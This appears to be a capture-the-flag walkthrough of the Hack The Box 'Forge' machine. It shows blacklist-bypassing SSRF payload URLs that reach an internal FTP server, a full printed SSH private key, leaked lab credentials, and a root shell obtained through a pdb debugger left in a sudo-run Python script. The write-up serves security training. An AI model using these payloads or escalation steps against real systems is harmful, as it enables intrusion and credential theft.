# Forge

# Nmap

First, as always, we’ve started with a full nmap port scan.

```bash
─[us-dedivip-1]─[10.10.16.23]─[th3g3ntl3m4n@htb]─[~/htb/Forge]
└──╼ [★]$ sudo nmap -v -sS -Pn -p- --min-rate=300 --max-rate=500 10.10.11.111

PORT   STATE    SERVICE
21/tcp filtered ftp
22/tcp open     ssh
80/tcp open     http
```

Now, let’s perform a detailed versioned port scan on open ports.

```bash
─[us-dedivip-1]─[10.10.16.23]─[th3g3ntl3m4n@htb]─[~/htb/Forge]
└──╼ [★]$ sudo nmap -vv -A -Pn -p 21,22,80 -oA nmap/forge 10.10.11.111

PORT   STATE    SERVICE REASON         VERSION                                                                                                                                                
21/tcp filtered ftp     no-response                                                                                                                                                           
22/tcp open     ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)                                                                                           
| ssh-hostkey:                                                                                                                                                                                
|   3072 4f:78:65:66:29:e4:87:6b:3c:cc:b4:3a:d2:57:20:ac (RSA)                                                                                                                                
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC2sK9Bs3bKpmIER8QElFzWVwM0V/pval09g7BOCYMOZihHpPeE4S2aCt0oe9/KHyALDgtRb3++WLuaI6tdYA1k4bhZU/0bPENKBp6ykWUsWieSSarmd0sfekrbcqob69pUJSxIVzLrzXbg4CWnnLh/
UMLc3emGkXxjLOkR1APIZff3lXIDr8j2U3vDAwgbQINDinJaFTjDcXkOY57u4s2Si4XjJZnQVXuf8jGZxyyMKY/L/RYxRiZVhDGzEzEBxyLTgr5rHi3RF+mOtzn3s5oJvVSIZlh15h2qoJX1v7N/N5/7L1RR9rV3HZzDT+reKtdgUHEAKXRdfrff04hXy6
aepQm+kb4zOJRiuzZSw6ml/N0ITJy/L6a88PJflpctPU4XKmVX5KxMasRKlRM4AMfzrcJaLgYYo1bVC9Ik+cCt7UjtvIwNZUcNMzFhxWFYFPhGVJ4HC0Cs2AuUC8T0LisZfysm61pLRUGP7ScPo5IJhwlMxncYgFzDrFRig3DlFQ0=                
|   256 79:df:3a:f1:fe:87:4a:57:b0:fd:4e:d0:54:c6:28:d9 (ECDSA)                                                                                                                               
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBH67/BaxpvT3XsefC62xfP5fvtcKxG2J2di6u8wupaiDIPxABb5/S1qecyoQJYGGJJOHyKlVdqgF1Odf2hAA69Y=                            
|   256 b0:58:11:40:6d:8c:bd:c5:72:aa:83:08:c5:51:fb:33 (ED25519)                                                                                                                             
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILcTSbyCdqkw29aShdKmVhnudyA2B6g6ULjspAQpHLIC                                                                                                            
80/tcp open     http    syn-ack ttl 63 Apache httpd 2.4.41                                                                                                                                    
|_http-title: Did not follow redirect to http://forge.htb                                                                                                                                     
| http-methods:                                                                                                                                                                               
|_  Supported Methods: GET HEAD POST OPTIONS                                                                                                                                                  
|_http-server-header: Apache/2.4.41 (Ubuntu)                                                                                                                                                  
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port                                                                                         
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete                                                                                                             
Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.
17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)                                                                                                              
No exact OS matches for host (test conditions non-ideal).
```

We’ve noticed that we have to add in our hosts file the IP and the hostname that the server is trying to redirect for.

Now, we can access the website.

![Untitled](images/Untitled.png)

# Enumeration

Let’s executing a brute-force directories on the host.

```bash
─[us-dedivip-1]─[10.10.16.23]─[th3g3ntl3m4n@htb]─[~/htb/Forge]
└──╼ [★]$ gobuster dir -e -u "http://forge.htb/" -w "/opt/SecLists/Discovery/Web-Content/raft-large-directories.txt" -t 50 -x txt,json,php -o gobuster/forge

http://forge.htb/uploads              (Status: 301) [Size: 224] [--> http://forge.htb/uploads/]
http://forge.htb/upload               (Status: 200) [Size: 929]                                
http://forge.htb/static               (Status: 301) [Size: 307] [--> http://forge.htb/static/] 
http://forge.htb/server-status        (Status: 403) [Size: 274]
```

As we can see, we have a file upload functionality.

![Untitled](images/Untitled%201.png)

And accessing “Upload from URL” we’ve got.

![Untitled](images/Untitled%202.png)

Testing this functionality, we’ve write our IP address in order to see if we get any connection back to our python HTTP sever.

![Untitled](images/Untitled%203.png)

```bash
─[us-dedivip-1]─[10.10.16.23]─[th3g3ntl3m4n@htb]─[~/htb/images/exploitation]
└──╼ [★]$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.11.111 - - [22/Jan/2022 12:36:01] code 404, message File not found
10.10.11.111 - - [22/Jan/2022 12:36:01] "GET /test.jpg HTTP/1.1" 404 -
```

And we’ve got a connection back. Using a netcat listener, we’ve got a more detailed response.

```jsx
─[us-dedivip-1]─[10.10.16.23]─[th3g3ntl3m4n@htb]─[~/htb/images/exploitation]
└──╼ [★]$ sudo nc -vnlp 80
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::80
Ncat: Listening on 0.0.0.0:80
Ncat: Connection from 10.10.11.111.
Ncat: Connection from 10.10.11.111:59372.
GET / HTTP/1.1
Host: 10.10.16.23
User-Agent: python-requests/2.25.1
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
```

As we can see, the requests are made in python. Let’s try to access a file on the system.

![Untitled](images/Untitled%204.png)

On our burpsuite, we’ve got.

![Untitled](images/Untitled%205.png)

Accessing the own host via URL upload, we’ve got a blacklisted request.

![Untitled](images/Untitled%206.png)

In order to bypass it,  sometimes we’ve just change the lower/upper case host name on URL.

![Untitled](images/Untitled%207.png)

Now, let’s enumerate for possible virtual hosts on the server. We’ve filtered the output because all words in our wordlist was printed in output with 302 HTTP status code.

```bash
─[us-dedivip-1]─[10.10.16.23]─[th3g3ntl3m4n@htb]─[~/htb/Forge]
└──╼ [★]$ gobuster vhost -u http://forge.htb/ -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -t 50 -o gobuster/forge_vhosts | grep -v "Status: 302"

Found: admin.forge.htb (Status: 200) [Size: 27]
```

As we can see, we’ve got a admin vhost. Let’s write it on our hosts file.

Accessing the new discovered host, we’ve got the following message.

![Untitled](images/Untitled%208.png)

Trying to access this URL via Upload URL function, we’ve got a blacklisted. We can bypass it put some letters in upper case.

![Untitled](images/Untitled%209.png)

![Untitled](images/Untitled%2010.png)

And access the link that was gave us using curl.

```bash
─[us-dedivip-1]─[10.10.16.23]─[th3g3ntl3m4n@htb]─[~/htb/Forge]
└──╼ [★]$ curl http://forge.htb/uploads/sm1x8JpeQPRNYyhSrpCt
<!DOCTYPE html>
<html>
<head>
    <title>Admin Portal</title>
</head>
<body>
    <link rel="stylesheet" type="text/css" href="/static/css/main.css">
    <header>
            <nav>
                <h1 class=""><a href="/">Portal home</a></h1>
                <h1 class="align-right margin-right"><a href="/announcements">Announcements</a></h1>
                <h1 class="align-right"><a href="/upload">Upload image</a></h1>
            </nav>
    </header>
    <br><br><br><br>
    <br><br><br><br>
    <center><h1>Welcome Admins!</h1></center>
</body>
</html>
```

Or we can try to use the redirection request where we captured via burpsuite.

```bash
GNU nano 5.4                                                                                  req                                                                                           
HTTP/1.1 301 MOVED PERMANENTLY
Location: http://admin.forge.htb/
```

We’ve created a file with the request above and serve this file on netcat linstener.

```bash
─[us-dedivip-1]─[10.10.16.23]─[th3g3ntl3m4n@htb]─[~/htb/images/www]
└──╼ [★]$ sudo nc -vnlp 80 < req 
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::80
Ncat: Listening on 0.0.0.0:80
```

Making a request to our netcat listener.

![Untitled](images/Untitled%2011.png)

Back to our netcat listener.

```bash
─[us-dedivip-1]─[10.10.16.23]─[th3g3ntl3m4n@htb]─[~/htb/images/www]
└──╼ [★]$ sudo nc -vnlp 80 < req 
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::80
Ncat: Listening on 0.0.0.0:80
Ncat: Connection from 10.10.11.111.
Ncat: Connection from 10.10.11.111:55264.
GET / HTTP/1.1
Host: 10.10.16.23
User-Agent: python-requests/2.25.1
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
```

And we bypassed it.

![Untitled](images/Untitled%2012.png)

Curling this link.

```bash
─[us-dedivip-1]─[10.10.16.23]─[th3g3ntl3m4n@htb]─[~/htb/images/www]
└──╼ [★]$ curl http://forge.htb/uploads/3Qs573wR7pCsd9vi84lC
<!DOCTYPE html>
<html>
<head>
    <title>Admin Portal</title>
</head>
<body>
    <link rel="stylesheet" type="text/css" href="/static/css/main.css">
    <header>
            <nav>
                <h1 class=""><a href="/">Portal home</a></h1>
                <h1 class="align-right margin-right"><a href="/announcements">Announcements</a></h1>
                <h1 class="align-right"><a href="/upload">Upload image</a></h1>
            </nav>
    </header>
    <br><br><br><br>
    <br><br><br><br>
    <center><h1>Welcome Admins!</h1></center>
</body>
</html>
```

Let’s keeping it simple and using the first technique. Let’s access the announcements link on admin page.

![Untitled](images/Untitled%2013.png)

![Untitled](images/Untitled%2014.png)

Let’s curling this link.

```bash
─[us-dedivip-1]─[10.10.16.23]─[th3g3ntl3m4n@htb]─[~/htb/images/www]
└──╼ [★]$ curl http://forge.htb/uploads/gFirEjY6q8WY2HCyCJI0
<!DOCTYPE html>
<html>
<head>
    <title>Announcements</title>
</head>
<body>
    <link rel="stylesheet" type="text/css" href="/static/css/main.css">
    <link rel="stylesheet" type="text/css" href="/static/css/announcements.css">
    <header>
            <nav>
                <h1 class=""><a href="/">Portal home</a></h1>
                <h1 class="align-right margin-right"><a href="/announcements">Announcements</a></h1>
                <h1 class="align-right"><a href="/upload">Upload image</a></h1>
            </nav>
    </header>
    <br><br><br>
    <ul>
        <li>An internal ftp server has been setup with credentials as user:heightofsecurity123!</li>
        <li>The /upload endpoint now supports ftp, ftps, http and https protocols for uploading from url.</li>
        <li>The /upload endpoint has been configured for easy scripting of uploads, and for uploading an image, one can simply pass a url with ?u=&lt;url&gt;.</li>
    </ul>
</body>
</html>
```

As we can see, we’ve got the internal ftp server credentials. The upload function accepts more protocols and we can upload an image just passing a URL to parameter `u=` like `?u=<url>` .

First, let’s trying to make a double SSRF and log into internal FTP server. Our request will be the following.

```bash
http://AdMin.ForGe.hTb/upload?u=ftp://user:heightofsecurity123!@0x7f000001/
```

The `0x7f000001` represents `127.0.0.1` on hexadecimal format. Making the request.

![Untitled](images/Untitled%2015.png)

Curling the link.

```bash
─[us-dedivip-1]─[10.10.16.23]─[th3g3ntl3m4n@htb]─[~/htb/images/www]
└──╼ [★]$ curl http://forge.htb/uploads/VnE4xyjs79egFSPv2QjX
drwxr-xr-x    3 1000     1000         4096 Aug 04 19:23 snap
-rw-r-----    1 0        1000           33 Jan 23 15:03 user.txt
```

We were able to log into internal FTP server by a SSRF vulnerability and listing the some home user folder.

Let’s try to see if we can get the content of the .ssh folder. Our request.

```bash
http://AdMin.ForGe.hTb/upload?u=ftp://user:heightofsecurity123!@0x7f000001/.ssh/
```

Curling the link again.

```bash
─[us-dedivip-1]─[10.10.16.23]─[th3g3ntl3m4n@htb]─[~/htb/images/www]
└──╼ [★]$ curl http://forge.htb/uploads/uExNqjWgDoGqgjK2cupZ
-rw-------    1 1000     1000          564 May 31  2021 authorized_keys
-rw-------    1 1000     1000         2590 May 20  2021 id_rsa
-rw-------    1 1000     1000          564 May 20  2021 id_rsa.pub
```

Now let’s get the SSH private key of this user.

Our request will be.

```bash
http://AdMin.ForGe.hTb/upload?u=ftp://user:heightofsecurity123!@0x7f000001/.ssh/id_rsa
```

Curling the link.

```bash
─[us-dedivip-1]─[10.10.16.23]─[th3g3ntl3m4n@htb]─[~/htb/images/www]
└──╼ [★]$ curl http://forge.htb/uploads/XJfN2JnnWVh4Jg3FiCas
-----BEGIN OPENSSH PRIVATE KEY-----
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
shlLupso7WoS0AAAAKdXNlckBmb3JnZQE=
-----END OPENSSH PRIVATE KEY-----
```

We got the id_rsa key! Let’s login as user via SSH.

```bash
─[us-dedivip-1]─[10.10.16.23]─[th3g3ntl3m4n@htb]─[~/htb/images/exploitation/user]
└──╼ [★]$ ssh -i id_rsa user@forge.htb
The authenticity of host 'forge.htb (10.10.11.111)' can't be established.
ECDSA key fingerprint is SHA256:e/qp97tB7zm4r/sMgxwxPixH0d4YFnuB6uKn1GP5GTw.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'forge.htb,10.10.11.111' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-81-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun 23 Jan 2022 07:55:07 PM UTC

  System load:  0.0               Processes:             226
  Usage of /:   43.8% of 6.82GB   Users logged in:       1
  Memory usage: 23%               IPv4 address for eth0: 10.10.11.111
  Swap usage:   0%

0 updates can be applied immediately.

The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Sun Jan 23 16:33:46 2022 from 10.10.14.103
-bash-5.0$ id
uid=1000(user) gid=1000(user) groups=1000(user)
```

# Privilege Escalation

Heading to privilege escalation, we’ve perform a `sudo -l` command and we’ve got.

```bash
-bash-5.0$ sudo -l
Matching Defaults entries for user on forge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User user may run the following commands on forge:
    (ALL : ALL) NOPASSWD: /usr/bin/python3 /opt/remote-manage.py
```

We can execute `/usr/bin/python3 /opt/remote-manage.py` as root without password.

Checking the script.

```python
#!/usr/bin/env python3
import socket
import random
import subprocess
import pdb

port = random.randint(1025, 65535)

try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(('127.0.0.1', port))
    sock.listen(1)
    print(f'Listening on localhost:{port}')
    (clientsock, addr) = sock.accept()
    clientsock.send(b'Enter the secret passsword: ')
    if clientsock.recv(1024).strip().decode() != 'secretadminpassword':
        clientsock.send(b'Wrong password!\n')
    else:
        clientsock.send(b'Welcome admin!\n')
        while True:
            clientsock.send(b'\nWhat do you wanna do: \n')
            clientsock.send(b'[1] View processes\n')
            clientsock.send(b'[2] View free memory\n')
            clientsock.send(b'[3] View listening sockets\n')
            clientsock.send(b'[4] Quit\n')
            option = int(clientsock.recv(1024).strip())
            if option == 1:
                clientsock.send(subprocess.getoutput('ps aux').encode())
            elif option == 2:
                clientsock.send(subprocess.getoutput('df').encode())
            elif option == 3:
                clientsock.send(subprocess.getoutput('ss -lnt').encode())
            elif option == 4:
                clientsock.send(b'Bye\n')
                break
except Exception as e:
    print(e)
    pdb.post_mortem(e.__traceback__)
finally:
    quit()
```

As we can see, we’ve some password.

| USER | PASSWORD |
| --- | --- |
| - | secretadminpassword |

Interacting with this python app, we’ve got.

![Untitled](images/Untitled%2016.png)

Well, if we read the application  source code, we’ve see there is a exception block that calls a python debugger (pdb). Let’s running the application again and generate an error in order to catch the error exception.

```bash
-bash-5.0$ sudo /usr/bin/python3 /opt/remote-manage.py
Listening on localhost:8683

```

And on other tmux panel.

```bash
-bash-5.0$ nc -v localhost 8683
Connection to localhost 8683 port [tcp/*] succeeded!
Enter the secret passsword: secretadminpassword
Welcome admin!

What do you wanna do: 
[1] View processes
[2] View free memory
[3] View listening sockets
[4] Quit
```

We hit enter twice and we’ve generated an error.

```bash
invalid literal for int() with base 10: b''
> /opt/remote-manage.py(27)<module>()
-> option = int(clientsock.recv(1024).strip())
(Pdb)
```

Now, let’s coding our Proof of Concept (PoC) and execute the id command in the pdb.

```bash
(Pdb) import os
(Pdb) os.system("id")
uid=0(root) gid=0(root) groups=0(root)
0
```

We can get root. Now, let’s coding our payload calling `/bin/bash` on pdb.

```bash
(Pdb) os.system("/bin/bash")
root@forge:/opt# id
uid=0(root) gid=0(root) groups=0(root)
root@forge:/opt#
```

Now we’ve have a shell on system as root.

![Untitled](images/Untitled%2017.png)